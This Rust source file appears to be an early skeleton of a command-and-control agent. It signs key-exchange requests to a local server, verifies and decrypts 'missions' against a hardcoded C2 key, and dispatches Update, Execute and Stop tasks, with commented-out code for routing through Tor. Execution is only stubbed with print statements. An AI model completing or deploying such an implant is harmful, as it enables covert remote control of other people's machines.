// use arti_client::{TorClient, TorClientConfig};
// use arti_hyper::ArtiHttpConnector;
use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{api, crypto, Mission, Task};
// use futures::{Stream, StreamExt};
// use hyper::Body;
// use tls_api::{TlsConnector as TlsConnectorTrait, TlsConnectorBuilder};
// use tls_api_openssl::TlsConnector;

// #[cfg(debug_assertions)]
// struct MissionStream;

// #[cfg(not(debug_assertions))]
// struct MissionStream {
//     tor_client: TorClient<PreferredRuntime>,
// }

// #[cfg(not(debug_assertions))]
// impl MissionStream {
//     fn new() -> Self {
//         MissionStream {
//             tor_client: TorClient::create_bootstrapped(TorClientConfig::default()),
//         }
//     }
// }

// #[cfg(not(debug_assertions))]
// impl Stream for MissionStream {
//     type Item = Vec<Mission>;

//     fn poll_next(
//         self: std::pin::Pin<&mut Self>,
//         cx: &mut std::task::Context<'_>,
//     ) -> std::task::Poll<Option<Self::Item>> {
//         let http = hyper::Client::new();
//         let mut resp = http.get("localhost:3000".try_into()?).await?;
//         let mut resp = tokio::join!(http.get("localhost:3000".try_into()?));

//         println!("Status: {}", resp.status());
//         let body = hyper::body::to_bytes(resp.body_mut()).await?;
//         println!("Body: {}", std::str::from_utf8(&body)?);
//         cx.waker().wake_by_ref();
//         std::task::Poll::Pending
//     }
// }

// #[tokio::main]
// async fn main() -> anyhow::Result<()> {
//     println!("Starting Arti...");
//     let tor_client = TorClient::create_bootstrapped(TorClientConfig::default()).await?;

//     let tls_connector = TlsConnector::builder()?.build()?;

//     let tor_connector = ArtiHttpConnector::new(tor_client, tls_connector);
//     let http = hyper::Client::builder().build::<_, Body>(tor_connector);

//     println!("Requesting http://icanhazip.com via Tor...");
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     println!("Requesting http://icanhazip.com without Tor...");
//     let http = hyper::Client::new();
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     Ok(())
// }

const IDENTITY: &str = "1nlpuul3mNmk9oJ27Usp5Ekfm+MM1CMYBX8FiLTwqd8=";
const C2_VERIFYING_KEY: &str = "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk=";

// async fn get_mission() -> anyhow::Result<Vec<Mission>> {
//     let http = hyper::Client::new();
//     let mut resp = http.get("http://localhost:3000".try_into()?).await?;

//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);
//     Ok(serde_json::from_slice(&body)?)
// }

async fn get_mission() -> anyhow::Result<Vec<Mission>> {
    let mut signing_key = crypto::get_identity_from(
        BASE64_STANDARD
            .decode(IDENTITY)
            .unwrap()
            .as_slice()
            .try_into()
            .unwrap(),
    )?;

    let (public_key, private_key, signature) =
        crypto::generate_key_exchange_key_pair(&mut signing_key);

    let response = ureq::get("http://localhost:3000")
        .send_json(ureq::json!(
            {
                "identity": signing_key.verifying_key().as_bytes(),
                "publicKey": public_key,
                "signature": signature.to_bytes().as_slice(),
            }
        ))
        .map_err(|e| anyhow::anyhow!(e))?;

    // println!("Status: {}", response.status());
    let body: api::Response = response.into_json().unwrap();
    let verifying_key = crypto::VerifyingKey::from_bytes(
        BASE64_STANDARD
            .decode(C2_VERIFYING_KEY)
            .unwrap()
            .as_slice()
            .try_into()
            .unwrap(),
    )
    .unwrap();
    crypto::verify(
        &verifying_key,
        body.signature,
        &[],
        body.public_key,
        &body.encrypted_data,
        body.nonce,
    )
    .unwrap();
    let decrypted_data = crypto::decrypt(
        &body.encrypted_data,
        body.public_key,
        private_key,
        body.nonce,
    )
    .unwrap();
    println!(
        "Decrypted data: {:?}",
        std::str::from_utf8(&decrypted_data).unwrap()
    );
    Ok(vec![])
    // Ok(serde_json::from_slice(body.as_bytes()).map_err(|e| anyhow::anyhow!(e))?)
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("Starting agent");
    loop {
        for mission in get_mission().await? {
            for task in mission.tasks {
                match task {
                    Task::Update(data) => {
                        println!("Updating with data: {:?}", data);
                    }
                    Task::Execute(command) => {
                        println!("Executing command: {:?}", command);
                    }
                    Task::Stop => {
                        println!("Stopping agent");
                        return Ok(());
                    }
                }
            }
        }
    }
}
